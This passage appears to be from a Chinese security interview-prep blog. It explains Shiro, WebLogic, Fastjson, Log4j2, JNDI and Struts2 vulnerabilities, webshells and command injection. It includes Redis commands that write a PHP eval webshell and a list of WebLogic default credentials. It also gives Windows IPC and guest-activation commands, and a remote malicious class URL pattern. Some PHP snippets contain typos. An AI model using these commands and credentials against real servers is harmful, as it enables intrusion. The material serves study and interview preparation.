<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">远程代码执行、war后门文件部署</span><br></pre></td></tr></table></figure>
<p>JBoss</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化漏洞、war后门文件部署</span><br></pre></td></tr></table></figure>
<p>WebLogic</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化漏洞SSRF任意文件上传war后门文件部署</span><br></pre></td></tr></table></figure>
<p>Apache Shiro 反序列化漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Shiro rememberMe（Shiro-550） Shiro Padding Oracle Attack(Shiro-721)</span><br></pre></td></tr></table></figure>
<h3 id="问三十一：平常怎么去发现-Shiro-漏洞的？"><a href="#问三十一：平常怎么去发现-Shiro-漏洞的？" class="headerlink" title="问三十一：平常怎么去发现 Shiro 漏洞的？"></a>问三十一：平常怎么去发现 Shiro 漏洞的？</h3><p>Apache Shiro 是一个 Java 安全框架，执行身份验证、授权、密码和会话管理。apacheShiro 框架提供了记住我（RememberMe）的功能，关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。</p>
<p>shiro 反序列化漏洞：shiro 在 CookieRememberMeManaer 类中将 cookie 中 rememberMe  字段内容分别进行序列化、AES 加密、Base64 编码操作。攻击者构造一个恶意的对象，并且对其序列化，AES 加密，base64 编码后，作为 cookie 的 rememberMe 字段发送。Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p>
<p>登陆失败时候会返回 rememberMe=deleteMe 字段或者使用 shiroScan 被动扫描去发现</p>
<p>完整：</p>
<p>未登陆的情况下，请求包的 cookie 中没有 rememberMe 字段，返回包 set-Cookie 里也没有 deleteMe 字段</p>
<p>登陆失败的话，不管勾选 RememberMe 字段没有，返回包都会有 rememberMe=deleteMe 字段</p>
<p>不勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段。但是之后的所有请求中 Cookie 都不会有 rememberMe 字段</p>
<p>勾选 RememberMe 字段，登陆成功的话，返回包 set-Cookie 会有 rememberMe=deleteMe 字段，还会有 rememberMe 字段，之后的所有请求中 Cookie 都会有 rememberMe 字段</p>
<p>shiro 有几种漏洞类型</p>
<p>shiro 550</p>
<p>shiro 721</p>
<p>Apache Shiro 框架提供了记住我的功能（RemeberMe），用户登录成功后会生成经过加密并编码的 cookie。cookie 的 key 为  RemeberMe，cookie 的值是经过对相关信息进行序列化，然后使用 aes 加密，最后在使用 base64 编码处理形成的</p>
<p>在服务端接收 cookie 值时，按以下步骤解析：</p>
<blockquote>
<p>检索 RemeberMe cookie 的值</p>
<p>Base 64 解码</p>
<p>使用 ACE 解密（加密密钥硬编码）</p>
<p>进行反序列化操作（未作过滤处理）</p>
</blockquote>
<p>在调用反序列化的时候未进行任何过滤，导致可以触发远程代码执行漏洞</p>
<p>用户登陆成功后会生成经过加密并编码的  cookie，在服务端接收 cookie 值后，Base64 解码 —&gt;AES 解密 —&gt; 反序列化。攻击者只要找到 AES  加密的密钥，就可以构造一个恶意对象，对其进行序列化 —&gt;AES 加密 —&gt;Base64 编码，然后将其作为 cookie 的  rememberMe 字段发送，Shiro 将 rememberMe 进行解密并且反序列化，最终造成反序列化漏洞。</p>
<h3 id="问三十二：WebLogic-权限绕过的姿势？"><a href="#问三十二：WebLogic-权限绕过的姿势？" class="headerlink" title="问三十二：WebLogic 权限绕过的姿势？"></a>问三十二：WebLogic 权限绕过的姿势？</h3><p><code>CVE-2020-14883</code> 是一个 <code>Console</code> 的未授权访问，而 <code>CVE-2020-14883</code> 是在利用未授权访问的前提下，在 <code>Console</code> 进行代码执行，于是远程攻击者可以构造特殊的 <code>HTTP</code> 请求，在未经身份验证的情况下接管 <code>WebLogic Server Console</code> ，并在 <code>WebLogic Server Console</code> 执行任意代码。</p>
<p>1、 通过静态资源来绕过权限验证，防止被重定向到登陆界面。</p>
<p>2、 通过请求 <code>.portal</code> ，控制处理的 <code>Servlet</code> 是渲染 <code>UI</code> 的 <code>MBeanUtilsInitSingleFileServlet</code> 。</p>
<p>3、 通过编码后的 <code>../</code> ，让最终渲染的模版是 <code>console.portal</code> 。</p>
<p>综合起来，才造成了最终的未授权访问。</p>
<h3 id="问三十三：Fastjson-漏洞利用原理？"><a href="#问三十三：Fastjson-漏洞利用原理？" class="headerlink" title="问三十三：Fastjson 漏洞利用原理？"></a>问三十三：Fastjson 漏洞利用原理？</h3><p>在请求包里面中发送恶意的 json 格式 payload，漏洞在处理 json 对象的时候，没有对 @type 字段进行过滤，从而导致攻击者可以传入恶意的  TemplatesImpl 类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java  实例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。</p>
<p>FastJson 是一个由阿里巴巴研发的 java 库，可以把 java 对象转换为 JSON 格式，也可以把 JSON 字符串转换为对象。</p>
<p>通俗理解就是：漏洞利用 fastjson autotype 在处理 json 对象的时候，未对 @type 字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程 rmi 主机，通过其中的恶意类执行代码。</p>
<p>攻击者通过这种方式可以实现远程代码执行漏洞的利用，获取服务器的敏感信息泄露，甚至可以利用此漏洞进一步对服务器数据进行修改，增加，删除等操作，对服务器造成巨大影响。</p>
<p>Fastjson RCE 的本质就是在反序列化时会调用目标类的 setter 方法。以 com.sun.rowset.JdbcRowSetImpl Gadget 为例，类中的 setAutoCommit 方法中通过 connect 方法调用了 lookup 方法，且 lookup 方法的参数又能通过  setDataSourceName 方法设置，即其参数可控。那么就会导致 JNDI 注入，最终实现任意命令执行。</p>
<p>Java 处理 Json 格式数据有三个比较流行的类库：</p>
<ul>
<li>Gson (google 维护) </li>
<li>Jackson</li>
<li>Fastjson </li>
</ul>
<h3 id="问三十四：简述一下Redis-未授权访问漏洞。"><a href="#问三十四：简述一下Redis-未授权访问漏洞。" class="headerlink" title="问三十四：简述一下Redis 未授权访问漏洞。"></a>问三十四：简述一下Redis 未授权访问漏洞。</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将  Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写  WebShell、写 SSH 公钥、创建计划任务反弹 Shell 等。其思路都是一样的，就是先将 Redis 的本地数据库存放目录设置为 web 目录、~/.ssh 目录或 /var/spool/cron 目录等，然后将  dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行 save 或 bgsave  保存，则我们就指定的目录里写入指定的文件了。</p>
<p>redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网。 没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/ </span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">"&lt;?php eval(<span class="variable">$_POST</span>[whoami]);?&gt;"</span> </span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<h3 id="问三十五：Redis-未授权访问漏洞如何利用？"><a href="#问三十五：Redis-未授权访问漏洞如何利用？" class="headerlink" title="问三十五：Redis 未授权访问漏洞如何利用？"></a>问三十五：Redis 未授权访问漏洞如何利用？</h3><blockquote>
<p>服务端的 Redis 连接存在未授权，在攻击机上能用 redis-cli 直接登陆连接，并未登陆验证。 开了服务端存在 Web 服务器，并且知道 Web 目录的路径（如利用 phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限。</p>
</blockquote>
<h3 id="问三十六：讲一下MongoDB-未授权访问漏洞"><a href="#问三十六：讲一下MongoDB-未授权访问漏洞" class="headerlink" title="问三十六：讲一下MongoDB 未授权访问漏洞"></a>问三十六：讲一下MongoDB 未授权访问漏洞</h3><p> <a href="https://cloud.tencent.com/product/mongodb?from=10680" target="_blank" rel="noopener">MongoDB</a> 服务安装后，默认未开启权限验证。如果服务监听在 0.0.0.0，则可远程无需授权访问<a href="https://cloud.tencent.com/solution/database?from=10680" target="_blank" rel="noopener">数据库</a>。</p>
<p>​    3.0 之前版本的 MongoDB, 默认监听在 0.0.0.0，3.0 及之后版本默认监听在 127.0.0.1。</p>
<p>​    3.0 之前版本，如未添加用户管理员账号及数据库账号，使用 —auth 参数启动时，在本地通过 127.0.0.1 仍可无需账号密码登陆访问数据库，远程访问则提示需认证；</p>
<p>​    3.0 及之后版本，使用 —auth 参数启动后，无账号则本地和远程均无任何数据库访问权限。</p>
<h3 id="问三十七：JNDI-注入是什么？"><a href="#问三十七：JNDI-注入是什么？" class="headerlink" title="问三十七：JNDI 注入是什么？"></a>问三十七：JNDI 注入是什么？</h3><p>JNDI RCE 漏洞产生的原因就在于当我们在注册 RMI 服务时，可以指定 Codebase url，也就是远程要加载类的位置，设 置该属性可以让 JDNI 应用程序在加载时去寻找我们指定的类 ( 例如：<a href="http://ip:port/EvilObject.class">http://ip:port/EvilObject.class</a>) 。 </p>
<p>这里还有一个比较重要的点，也是触发恶意代码的点。就是当 JNDI 应用程序通过 lookup (RMI 服务的地址) 方法调用指 定 Codebase url  上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时， 漏洞就会触发。</p>
<h3 id="问三十八：讲一下WebLogic-系列漏洞"><a href="#问三十八：讲一下WebLogic-系列漏洞" class="headerlink" title="问三十八：讲一下WebLogic 系列漏洞"></a>问三十八：讲一下WebLogic 系列漏洞</h3><p>Weblogic 漏洞有哪些？</p>
<p>weblogic 就好多了，基于 T3 协议的反序列化；基于 xml 解析时候造成的反序列化，还有 ssrf，权限绕过等等 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Weblogic 反序列化漏洞 CVE-2021-2394</span><br><span class="line">Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109</span><br><span class="line">Weblogic RCE CVE-2020-14882&amp;14883</span><br><span class="line">weblogic jndi注入CVE-2020-14841</span><br><span class="line">Weblogic coherence组件iiop反序列化漏洞 (CVE-2020-14644)</span><br><span class="line">WebLogic UniversalExtractor反序列化漏洞 CVE-2020-14645</span><br><span class="line">WebLogic CVE-2020-14756 T3IIOP反序列化RCE</span><br><span class="line">Weblogic 远程代码执行漏洞 CVE-2020-2883</span><br><span class="line">Weblogic CVE-2020-2551 IIOP协议反序列化rce</span><br><span class="line">Weblogic反序列化漏洞 CVE-2019-2890</span><br><span class="line">Weblogic反序列化远程代码执行漏洞CVE-2019-2725</span><br><span class="line">Weblogic反序列化漏洞 CVE-2019-2729</span><br><span class="line">Weblogic任意文件读取漏洞（CVE-2019-2615)）</span><br><span class="line">Weblogic 文件上传漏洞（CVE-2019-2618）</span><br><span class="line">weblogic 反序列化漏洞 CVE-2018-3252</span><br><span class="line">Weblogic反序列化远程代码执行漏洞 CVE-2018-3245</span><br><span class="line">Weblogic远程代码执行漏洞 CVE-2018-3191</span><br><span class="line">Weblogic任意文件上传漏洞（CVE-2018-2894）</span><br><span class="line">Weblogic WLS核心组件反序列化漏洞 CVE-2018-2893</span><br><span class="line">Weblogic WLS Core Components 反序列化命令执行漏洞 CVE-2018-2628</span><br><span class="line">WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</span><br><span class="line">Weblogic 反序列化漏洞 CVE-2017-3506</span><br><span class="line">Weblogic 反序列化漏洞 CVE-2017-3248</span><br><span class="line">Weblogic SSRF漏洞 CVE-2014-4210</span><br></pre></td></tr></table></figure>
<ul>
<li>Weblogic 漏洞扫描工具</li>
</ul>
<p>安装工具：</p>
<ol>
<li><p>安装依赖 python &gt;= 3.6 <code>pip3 install requests</code></p>
</li>
<li><p>下载 weblogicScanner</p>
<p><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
</li>
<li><p>进入 weblogicScanner</p>
</li>
<li><p>举例：测试本机是否存在漏洞 <code>python ws.py -t 127.0.0.1</code></p>
</li>
</ol>
<h3 id="问三十九：WebLogic-常用弱口令有哪些？"><a href="#问三十九：WebLogic-常用弱口令有哪些？" class="headerlink" title="问三十九：WebLogic 常用弱口令有哪些？"></a>问三十九：WebLogic 常用弱口令有哪些？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">weblogic Oracl@123</span><br><span class="line">weblogic weblogic</span><br><span class="line">guest guest</span><br><span class="line">portaladmin portaladmin</span><br><span class="line">admin security</span><br><span class="line">joe password</span><br><span class="line">mary password</span><br><span class="line">system security</span><br><span class="line">wlcsystem wlcsystem</span><br><span class="line">wlcsystem sipisystem</span><br><span class="line">system password</span><br></pre></td></tr></table></figure>
<h3 id="问四十：简述一下Log4j2-漏洞"><a href="#问四十：简述一下Log4j2-漏洞" class="headerlink" title="问四十：简述一下Log4j2 漏洞"></a>问四十：简述一下Log4j2 漏洞</h3><p>Apache Log4j2 是一个基于 Java 的日志记录工具。Apache Log4j 2.x &lt;= 2.14.1 版本存在远程代码执行漏洞。  漏洞的主要原因是 log4j2  的接收器对于不可靠来源的输入没有过滤，攻击者则可以利用此特性通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。由于 Log4j2  组件在处理程序日志记录时存在 JNDI 注入缺陷，未经授权的攻击者利用该漏洞，可向服务器发送恶意的数据，触发 log4j2  组件的缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。</p>
<p>为了输出日志时能够方便地输出任意位置的 java 对象，Log4j2 引入了一个叫 Lookup  的统一接口。这个接口允许在写日志的时候，按照具体的实现逻辑去查找对象的位置，并输出对象的内容。这里的对象通常在内存中，但由于 java  支持对象的序列化 / 反序列化，它也可以存储在硬盘文件里，甚至是远程服务器上。</p>
<p>我们提到的 JNDI 就是对 Lookup  接口的一种实现。其本身也是一个接口，提供了命名关键字到对象的映射目录，允许开发者提供一个名称，即可获取到对象的内容。LDAP，即轻量级目录访问协议，是 JNDI 的一种底层实现，它可以让我们方便的查询分布式数据库。既然是分布式的，LDAP  允许从远程服务器加载对象。而这里加载对象时使用的不是一般的反序列化方法，而是通过「命名引用」功能，支持直接从远程下载 class  文件并加载对象。</p>
<p>于是，Log4j2 中就暗含了注入漏洞：允许传入参数解析为 LDAP 协议，从远程服务器下载 class 文件并执行。这个功能本来是为了方便开发，使 java 对象位置对上层应用透明，却不料酿成大祸</p>
<h3 id="问四十一：简述Struts2-漏洞"><a href="#问四十一：简述Struts2-漏洞" class="headerlink" title="问四十一：简述Struts2 漏洞"></a>问四十一：简述Struts2 漏洞</h3><p>Struts2 是 apache 项目下的一个 web 框架，使用 OGNL 作为默认的表达式语言，由于 OGNL  能够创建或更改可执行代码，因此能够为使用它的任何框架引入严重的安全漏洞，多个 Apache Struts 2 版本容易受到 OGNL  安全漏洞的攻击。</p>
<h3 id="问四十二：WebShell-的利用"><a href="#问四十二：WebShell-的利用" class="headerlink" title="问四十二：WebShell 的利用"></a>问四十二：WebShell 的利用</h3><p>Webshell 是黑客经常使用的一种恶意脚本，其目的是获得对服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除 web  页面、修改主页等。黑客通常利用常见的漏洞，如 SQL 注入、远程文件包含 (RFI)、FTP，甚至使用跨站点脚本攻击 (XSS)  等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
<p>黑客可以用 web 的方式，通过 asp 或 php 木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等。</p>
<p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p>
<ul>
<li><p>WebShell 的分类 ①根据文件大小分类：大马和小马 (通常指的是一句话木马，能够使用菜刀这类工具去直接连接它) ②根据脚本名称分类：jsp、asp、aspx、php</p>
</li>
<li><p>WebShell 的利用</p>
<p>寻找页面上传点</p>
<p>写好一句话木马（上传木马），比如如下的 PHP 一句话木马的代码：</p>
<p><code>_POST[&#39;shell&#39;]); ?&gt;</code></p>
<p>然后寻找上传后的文件位置（绝对路径），可以用蚁剑、中国菜刀等工具连接到主机进行接下来的操作，比如提权。</p>
</li>
<li><p>WebShell 有哪些特征？</p>
<ul>
<li><p>持久化远程访问</p>
<p>Webshell 脚本通常会包含后门，黑客上传 Webshell 之后，就可以充分利用 Webshell  的后门实现远程访问并控制服务器，从而达到长期控制网站服务器的目的。此外，在上传完 Webshell  之后，黑客会选择自己修复漏洞，以确保没有其他人会利用该漏洞。通过这种方式，黑客就可以一种低调的姿态，避免与管理员进行任何交互，同时仍然获得相同的结果。</p>
</li>
</ul>
</li>
<li><p>提权</p>
<p>在服务器没有配置错误的情况下，Webshell 将在 web 服务器的用户权限下运行，而用户权限是有限的。通过 Webshell，黑客可以利用系统上的本地漏洞来实现权限提升，从而获得  Root 权限，这样黑客基本上可以在系统上做任何事情，包括安装软件、更改权限、添加和删除用户、窃取密码、阅读电子邮件等等。</p>
</li>
<li><p>隐藏性极强</p>
<p>Webshell 可以嵌套在正常网页中运行，且不容易被查杀。它还可以穿越服务器防火墙，由于与被控制服务器或远程主机交互的数据都是通过 80  端口传递，因此不会被防火墙拦截，在没有记录流量的情况下，Webshell 使用 post 包发送，也不会被记录在系统日志中，只会在 Web  日志中记录一些数据提交的记录。</p>
</li>
<li><p>WebShell 常用的 PHP 函数</p>
<p>Webshell 几乎适用于所有 Web 编程语言。之所以关注 PHP，是因为它是 web 上使用最广泛的编程语言。下面是 PHP 中一些执行 shell 命令最常用的函数。</p>
<ul>
<li><p>system()</p>
<p>system () 函数将命令作为参数，并输出结果。</p>
<p>下面的示例是在 Windows 操作系统上运行 dir 命令，然后返回 PHP 文件所在目录的目录列表。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">'ls -al'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>exec()</p>
<p>exec () 功能是将命令作为参数，但不输出结果。</p>
<p>如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> exce(<span class="string">'ls -al'</span>);</span><br><span class="line">    <span class="keyword">echo</span> exce(<span class="string">'ls -al'</span>,$array);</span><br><span class="line">    var_dump($array);</span><br></pre></td></tr></table></figure>
<p>shell_exec()</p>
<p>shell_exec () 函数类似于 exec ()，但是，其整个输出结果为字符串。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> shell_exce(<span class="string">'ls -al'</span>);</span><br></pre></td></tr></table></figure>
<p>passthru()</p>
<p>passthru () 执行一个命令并返回原始格式的输出。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> passthru(<span class="string">'ls -al'</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>proc_open()</p>
<p>proc_open () 可以创建一个处理程序（流程），实现脚本和要运行的程序之间的通信。</p>
</li>
<li><p>倒引号</p>
<p>PHP 会首先执行 shell 命令中倒引号（`）内的内容</p>
</li>
</ul>
<h3 id="问四十三：序列化与反序列化"><a href="#问四十三：序列化与反序列化" class="headerlink" title="问四十三：序列化与反序列化"></a>问四十三：序列化与反序列化</h3><ul>
<li>序列化：把对象转化为可传输的字节序列过程称为序列化</li>
<li>反序列化：把字节序列还原为对象的过程称为反序列</li>
</ul>
<h3 id="问四十四：命令执行漏洞是什么"><a href="#问四十四：命令执行漏洞是什么" class="headerlink" title="问四十四：命令执行漏洞是什么"></a>问四十四：命令执行漏洞是什么</h3><p>命令执行漏洞是值攻击者可以随意执行系统命令，它属于高危漏洞之一，也属于代码执行的范畴。命令执行漏洞不仅存在 B/S 架构中，还在 C/S 架构中也常常遇到。</p>
<p>应用有时需要调用一些执行系统命令的函数，如 PHP 的 system 、exec、shell_exec、passthru、proc_popen  等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
<p><strong>命令执行漏洞的危害</strong></p>
<ul>
<li>继承 web 服务程序的权限去执行系统命令或读写文件</li>
<li>反弹 Shell</li>
<li>控制整个网站甚至控制服务器</li>
<li>进一步内网渗透</li>
</ul>
<p><strong>命令执行漏洞的原理</strong></p>
<p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如 PHP 中的 system、 exec、shell_exec 等，如果用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常的命令中， 造成命令执行漏洞。</p>
<p>在操作系统中，“&amp;、|、||” 都可以作为命令连接符使用， 用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，从而造成漏洞。</p>
<p><strong>命令执行漏洞成因</strong></p>
<ul>
<li><p>代码层过滤不严格</p>
<p>商业应用需要执行命令，商业应用的一些核心代码可能在二进制文件当中，在 web 应用中通过 system 函数调用。例如 system (“/bin/program —arg c194a9eg&lt;!— begin-inline-katexarg”);</p>
</li>
<li><p>系统漏洞造成命令注入</p>
<p>例如 bash 破壳漏洞 (CVE-2014-6271)，如果我们控制执行的 bash 的环境变量，就可以通过破壳漏洞来执行任意代码。</p>
</li>
<li><p>第三方组件造成命令注入</p>
<p>如 Wordpress，可以选择 ImageMagick 这个常用的 图片处理组件，处理用户上传图片时造成命令执行，如 JAVA 中 Struts2/ElasticsearchGroovy 等。</p>
</li>
</ul>
<p><strong>命令执行漏洞常见函数</strong></p>
<ul>
<li>System 函数的语法是： system (string $command [, int &amp;end-inline-katex—&gt;return_var ] )<ul>
<li>同 C 版本的 system () 函数一样</li>
<li>本函数执行 command 参数所指定的命令，并且输出执行结果</li>
<li>命令执行后的返回值为输出值的最后一行</li>
<li>函数本身也会打印全部的输出值</li>
</ul>
</li>
<li>Exec 函数的语法为：exec (string $command [, array &amp;$output [, int &amp;c194a9eg&lt;!— begin-inline-katexreturn_var]] )<ul>
<li>这个函数的作用是执行 command 参数所指定的命令</li>
<li>命令执行后的值为输出值的最后一行</li>
<li>函数本身不会打印任何内容</li>
</ul>
</li>
<li>Passthru 函数的语法为：passthru (string $command [, int &amp;end-inline-katex—&gt;return_var ] )<ul>
<li>同 exec () 函数类似</li>
<li>passthru () 函数也是用来执行外部命令 command 的</li>
<li>当所执行的系统命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec () 或 system () 函数。</li>
</ul>
</li>
<li>Shell_exec 函数的语法为： shell_exec (string $cmd)<ul>
<li>cmd 是要执行的命令 </li>
<li>String 是参数的数据类型，也就是字符串。</li>
<li>函数会在命令执行完成后将全部的输出值作为字符串输入返回值，本身并不打印任何信息。 </li>
<li>Shell_exec 函数的用法同反引号形同，注意是反引号（``）而不是普通单引号（’’）。</li>
</ul>
</li>
</ul>
<p><strong>命令执行漏洞连接符</strong></p>
<p>&amp;: 顺序执行多条命令，而不管命令是否执行成功</p>
<p>&amp;&amp;: 逻辑与，当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令， 前面的命令执行失败，后面的命令不会执行，与 || 正好相反</p>
<p>|: 显示后面命令的结果</p>
<p>||: 逻辑或，当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。 前面的命令执行失败，后面的命令才会执行</p>
<p><strong>命令执行漏洞防御</strong></p>
<ul>
<li><p>不执行外部的应用程序或命令</p>
<p>尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在 执行 system、eval 等命令执行功能的函数前，要先确定参数内容。</p>
</li>
<li><p>使用 escapeshellarg 函数处理相关参数</p>
<p>Escapeshellarg 函数会将任何引起参数或命令结束的字符进行转义</p>
</li>
<li><p>使用 safe_mode_exec_dir 执行可执行的文件路径</p>
<p>将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文 件路径。</p>
</li>
</ul>
<h3 id="问四十五：Winodws-命令执行漏洞介绍"><a href="#问四十五：Winodws-命令执行漏洞介绍" class="headerlink" title="问四十五：Winodws 命令执行漏洞介绍"></a>问四十五：Winodws 命令执行漏洞介绍</h3><p>Windows 命令执行漏洞，就是在 Winodws 环境下存在的命令执行漏洞，通过相关的漏洞验证方法确认了存在命令执行漏洞后，我们可以使用 Windows 环境下的一些命令去对漏洞进行利用。</p>
<ul>
<li>通过涉及到主机探测、扫描、路由、协议、远程、进程、端口、服务等常见的 Windows 的命令</li>
<li>如果我们的服务器是一台 Windows 操作系统，存在着命令执行漏洞</li>
<li>我们就可以通过上面的这些漏洞进行命令执行的操作 </li>
<li>对 Windows 服务器系统进行扫描探测、进行进程和服务管理、进行内网渗透、服务器提限等</li>
</ul>
<h3 id="问四十六：Windows-命令执行漏洞利用"><a href="#问四十六：Windows-命令执行漏洞利用" class="headerlink" title="问四十六：Windows 命令执行漏洞利用**"></a>问四十六：Windows 命令执行漏洞利用**</h3><p>通过以上的学习我们知道了 Windows 下的命令执行漏洞的原理以及一些利用方法，下面将列出常用到的 Windows 命令，可以利用到 Windows 命令执行的漏洞当中去。</p>
<ul>
<li>ipconfig /all 查看网络连接</li>
<li>net use \ip\ipc$ “” /user:” “    建立 IPC 空链接</li>
<li>net use \ip\ipc$ “密码” /user:”用户名” 建立 IPC 非空链接</li>
<li>net use h: \ip\c$ “密码” /user:”用户名” 直接登陆后映射对方 C：到本地为 H:</li>
<li>net use h: \ip\c$ 登陆后映射对方 C：到本地为 H:</li>
<li>net use \ip\ipc$ /del 删除 IPC 链接</li>
<li>net use h: /del 删除映射对方到本地的为 H: 的映射</li>
<li>net user guest /active:yes 激活 guest 用户</li>
<li>net user guest 12345 用 guest 用户登陆后用将密码改为 12345</li>
<li>echo 信息 &gt;&gt; pass.txt 将 “信息” 保存到 pass.txt 文件中</li>
</ul>
<h3 id="问四十七：Linux-命令执行漏洞"><a href="#问四十七：Linux-命令执行漏洞" class="headerlink" title="问四十七：Linux 命令执行漏洞"></a>问四十七：Linux 命令执行漏洞</h3><ul>
<li>Linux 命令执行漏洞，就是在 Linux 服务器上存在的命令执行下漏洞</li>
<li>Linux 命令执行漏洞相对于 Windows 命令执行漏洞来说，利用起来更加的容易</li>
<li>因为 Linux 的一些操作本省就是需要通过一些命令去进行管理和执行</li>
</ul>
<p>命令在 Linux 中的执行分为 4 步：判断路径、检查别名、判断内外部、路径查找文件</p>
<h3 id="问四十八：Linux-命令执行漏洞Linux-命令执行漏洞利用"><a href="#问四十八：Linux-命令执行漏洞Linux-命令执行漏洞利用" class="headerlink" title="问四十八：Linux 命令执行漏洞Linux 命令执行漏洞利用"></a>问四十八：Linux 命令执行漏洞Linux 命令执行漏洞利用</h3><ul>
<li>Linux 系统下基本命令，我们注意这些命令要区分大小写</li>
<li>通过这些命令我们可以对 Linux 下的命令执行漏洞进行利用</li>
<li>包括系统、资源、进程、网络、用户、服务等常见的 Linux 系统命令</li>
</ul>
<h1 id="四、内网渗透"><a href="#四、内网渗透" class="headerlink" title="四、内网渗透"></a>四、内网渗透</h1><h3 id="问四十九：内网渗透基本流程"><a href="#问四十九：内网渗透基本流程" class="headerlink" title="问四十九：内网渗透基本流程"></a>问四十九：内网渗透基本流程</h3><p>漏洞挖掘 - 漏洞利用 - 提权准备 - 提权</p>
<p><img src="HW%E9%9D%A2%E7%BB%8F100%E9%97%AE%EF%BC%88%E5%90%AB%E7%AD%94%E6%A1%88%EF%BC%89.assets/20181201221817863.png" alt="img"></p>
<p>前提是利用已经控制的一台计算机作为入侵内网的跳板，在其他内网计算机看来访问全部来自于跳板机 (WEB Server)</p>
